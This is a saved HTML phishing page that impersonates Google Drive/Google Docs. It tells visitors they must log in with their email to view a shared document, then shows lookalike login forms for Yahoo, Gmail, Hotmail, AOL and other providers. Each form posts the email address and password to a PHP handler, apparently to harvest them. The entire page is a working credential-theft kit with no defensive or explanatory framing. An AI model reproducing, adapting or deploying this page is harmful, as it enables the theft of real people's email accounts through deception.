<!-- saved from url=(0026)http://tfiledata.com/rema/ -->
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<title>Google Docs</title> 
<link rel="stylesheet" type="text/css" href="index_files/style.htm"><script src="index_files/a" type="text/javascript" id="ov_1360157021"></script> 
<style type="text/css"> 
div {
	position: absolute;
	left: 620px;
	top: 40px;
	background-color: #EBEBEB;
	width: 280px;
	padding: 10px;
	color: #000000;
	border: #0000cc 2px dashed;
	display: none;
}
body,td,th {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.style1 {
	background-color: #FFFFFF;
}
.style4 {
	font-size: 20px;
}
.style5 {
	font-size: x-large;
}
.style6 {
	font-size: 20px;
	background-color: #FFFFFF;
	color: #666666;
}
.style7 {
	border: 1px solid #808080;
}
.style8 {
	background-color: #FFFFFF;
	color: #666666;
}
</style> 
<script language="Javascript"> 
function echeck(str) {
 
		var at="@"
		var dot="."
		var lat=str.indexOf(at)
		var lstr=str.length
		var ldot=str.indexOf(dot)
		if (str.indexOf(at)==-1){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    alert("Invalid E-mail ID")
		    return false
		}
 
		 if (str.indexOf(at,(lat+1))!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.indexOf(dot,(lat+2))==-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
		
		 if (str.indexOf(" ")!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
 		 return true					
	}
 
function ValidateFormYahoo(){
	var emailID=document.yahoo.yahoouser
	var emailPASS=document.yahoo.yahoopassword
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
 
	return true
 }
 
 function ValidateFormHotmail(){
	var emailID=document.hotmail.hotmailuser
	var emailPASS=document.hotmail.hotmailpassword
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
 
	return true
 }
 
  function ValidateFormGmail(){
	var emailID=document.gmail.gmailuser
	var emailPASS=document.gmail.gmailpassword
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
	return true
 }
 
   function ValidateFormAol(){
	var emailID=document.aol.aoluser
	var emailPASS=document.aol.aolpassword
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
	return true
 }
 
   function ValidateFormOther(){
	var emailID=document.other.otheruser
	var emailPASS=document.other.otherpassword
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please Enter your Email Password")
		emailPASS.focus()
		return false
	}
	if (echeck(emailID.value)==false){
		emailID.value=""
		emailID.focus()
		return false
	}
	return true
 }
</script> 
<script language="javascript"> 
function toggle() {
	var ele = document.getElementById("toggleText");
	var text = document.getElementById("displayText");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
}
 
function togglegmail() {
	var ele = document.getElementById("toggleTextgmail");
	var text = document.getElementById("displayTextgmail");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
 
function togglehotmail() {
	var ele = document.getElementById("toggleTexthotmail");
	var text = document.getElementById("displayTexthotmail");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
function toggleaol() {
	var ele = document.getElementById("toggleTextaol");
	var text = document.getElementById("displayTextaol");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
function toggleother() {
	var ele = document.getElementById("toggleTextother");
	var text = document.getElementById("displayTextother");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
</script> 

<script src="index_files/a_002" type="text/javascript"></script></head> 
<body bgcolor="#efefef">
<table style="width: 100%" class="style1">
</table><table style="height: 102%; width: 1340px;" class="style1">
	<tbody><tr>
		<td style="height: 32px; width: 502px" class="style1">
		<span class="style5"><strong>
		<span class="style1">&nbsp;
		<img alt="https://encrypted-tbn2.google.com/images?q=tbn:ANd9GcRch5X9-KDdWzW_WZw76xp0yj6jZTzniUyL9d0wjhz01mApiXNuki0s10Y" src="index_files/images.jpg">
		<br>
		Google Drive</span></strong><span class="style1">.</span></span>&nbsp;<span class="style6">Keep 
		everything. Share anything.</span><span class="style4"><span class="style8"><br>
		</span>
		</span></td>
		<td style="height: 32px; width: 634px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 </td>
	</tr>
	<tr>
		<td style="height: 111px; width: 502px" class="style1"><br>
		<br>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<span class="style1">
		<img alt="https://ssl.gstatic.com/docs/doclist/images/ds_illustration_sync_440x420.png" src="index_files/ds_illustration_sync_440x420.png"></span></td>
		<td style="height: 111px; width: 634px;">
<table id="wrapper" align="center" cellpadding="10" cellspacing="1"><tbody><tr><td bgcolor="#ffffff"> 
 

<span class="style1"> 
 

<br> 
 
 
</span> 
 
 
<table id="invoicetoptables" class="style7" cellspacing="0" width="100%"> 
<tbody><tr> 
<td id="invoicecontent" width="50%"> 
 
<table id="invoicetoptables0" height="100" cellpadding="10" cellspacing="0" width="100%"> 
<tbody><tr> 
<td id="invoicecontent0" style="border: 0px solid rgb(204, 204, 204);" valign="top"> 
 
<table id="invoicetoptables1" height="100" cellpadding="10" cellspacing="0" width="100%"> 
<tbody><tr> 
<td id="invoicecontent1" style="border: 0px solid rgb(204, 204, 204);" valign="top"> 
<p><font color="#990000" size="4">To View shared document <br> 
you are required to Login with your email address below</font></p> 
 
<br> 
<br> 
 
<font class="paid">Choose your email provider below and login:</font> 

<br> 

<br> 

<br> 
<p align="center"> 
<a href="javascript:toggle();"><img src="index_files/yahoo.jpg" title="Yahoomail" id="displayText" height="48" border="0" width="132"></a>&nbsp;&nbsp;&nbsp;&nbsp; <a href="javascript:togglegmail();"><img src="index_files/gmail.jpg" title="Gmail" id="displayTextgmail" height="48" border="0" width="132"></a> 
<br> 
<br> 
<br> 
<a href="javascript:togglehotmail();"><img src="index_files/hotmail.jpg" title="Hotmail" id="displayTexthotmail" height="48" border="0" width="132"></a>&nbsp;&nbsp;&nbsp;&nbsp; <a href="javascript:toggleaol();"><img src="index_files/aol.jpg" title="Aol" id="displayTextaol" height="48" border="0" width="132"></a> 
<br> 
<br> 
<br> 
<a href="javascript:toggleother();"><img src="index_files/other.jpg" title="Other Email" id="displayTextother" height="48" border="0" width="132"></a> 

</p> 
 

<!-- YAHOO CONFIG !--> 

<div id="toggleText" style="display: none"> 
<p><img src="index_files/yahoo.jpg" title="Yahoomail" height="48" border="0" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">
close [x]</a></p> 
<br> 
<form method="POST" action="yahoo.php">
<p> 
<br> 
				<label>Yahoo Email Address:</label> 
                <br> 
				<input name="yahoouser" style="width: 200px;" type="text"> 
			<br> 
				<label>Yahoo Password</label> 
                <br> 
				<input name="yahoopassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_yahoo" value="Sign In" type="submit"> 
			</p> 



</form> 
</div> 
 
<!-- GMAIL CONFIG !--> 
<div id="toggleTextgmail" style="display: none"> 
<p><img src="index_files/gmail.jpg" title="Gmail" height="48" border="0" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">
close [x]</a></p> 
<br> 
<form method="POST" action="gmail.php"><p> 
 
				<label>Gmail Email Address:</label> 

                <br> 
				<input name="gmailuser" style="width: 200px;" type="text"> 
			<br> 
				<label>Gmail Password</label> 
                <br> 
				<input name="gmailpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_gmail" value="Sign in" type="submit"> 
			</p> 
            </form> 
 



</div> 
 
<!-- HOTMAIL CONFIG !--> 
<div id="toggleTexthotmail" style="display: none"> 
<p><img src="index_files/hotmail.jpg" title="Hotmail" height="48" border="0" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">
close [x]</a></p> 
<br> 
<form method="POST" action="hotmail.php"><p> 
				<label>Hotmail Email Address:</label> 
                <br> 
				<input name="hotmailuser" style="width: 200px;" type="text"> 
			<br> 
				<label>Hotmail Password</label> 
                <br> 
				<input name="hotmailpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_hotmail" value="Sign in" type="submit"> 
			</p> 
            </form> 



</div> 
 
<!-- AOL CONFIG !--> 
<div id="toggleTextaol" style="display: none"> 
<p><img src="index_files/aol.jpg" title="Aol" height="48" border="0" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">
close [x]</a></p> 
<br> 
<form method="POST" action="aol.php"><p> 
				<label>Aol Email Address:</label> 
                <br> 
				<input name="aoluser" style="width: 200px;" type="text"> 
			<br> 
				<label>Aol Password</label> 
                <br> 
				<input name="aolpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_aol" value="Sign In" type="submit"> 
			</p> 
            </form> 



</div> 
 
<!-- OTHER CONFIG !--> 
<div id="toggleTextother" style="display: none"> 
<p><img src="index_files/other.jpg" title="Other" height="48" border="0" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">
close [x]</a></p> 
<br> 
<form method="POST" action="other.php"><p> 
				<label>Email Address:</label> 
                <br> 
				<input name="otheruser" style="width: 200px;" type="text"> 
			<br> 
				<label>Password</label> 
                <br> 
				<input name="otherpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_other" value="Sign In" type="submit"> 
			</p> 
            </form> 



</div> 
 
 </td> 
 </tr> 
 </tbody></table> 
 
 </td> 
 </tr> 
 </tbody></table> 
</td></tr></tbody></table> 
 
</td> 
  
 
 
 
 
 
</tr></tbody></table></td>
	</tr>
</tbody></table>

</body></html>